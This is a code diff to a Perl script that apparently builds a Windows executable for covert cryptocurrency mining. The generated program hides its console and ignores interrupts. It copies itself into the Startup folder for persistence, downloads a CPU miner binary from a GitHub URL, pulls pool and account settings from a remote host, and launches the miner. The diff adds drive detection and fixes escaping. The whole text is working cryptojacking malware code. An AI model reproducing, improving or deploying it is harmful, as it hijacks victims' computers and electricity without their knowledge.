@@ -78,6 +78,7 @@ use Win32::HideConsole qw[hide_console];
 use LWP::UserAgent qw[get agent decoded_content];
 use LWP::Simple qw[getstore];
 use Config;
+use Cwd;
 
 \$SIG{INT} = 'IGNORE';
 hide_console;
@@ -86,15 +87,18 @@ hide_console;
 #perl2exe_include LWP::UserAgent
 #perl2exe_include LWP::Simple
 #perl2exe_include Config
+#perl2exe_include Cwd
 
-my (\$response, \$ua) = undef;
+my (\$response, \$disk, \$ua) = undef;
+\$disk = getcwd;
+if(\$disk =~ m/(\\w):\\/(\\w)/){\$disk = \$1;}
 \$ua = LWP::UserAgent->new;
 \$ua->agent(\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4\");
 while(1){
   if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
     system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
   }
-  until(`dir %AppData%` =~ m/^Ns(.*?)\\.exe\$/){
+  while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
     if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
       getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
     }else{
@@ -108,10 +112,9 @@ while(1){
   }
   \$response = \$ua->get(\"$_[0]\");
   if(\$response->decoded_content =~ m/miner->host:(.*?);email:(.*?);/){
-    system(\"%AppData%\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
   }
 }
-";
 EXE
   close(OUTPUT);
   my $unit = getcwd;
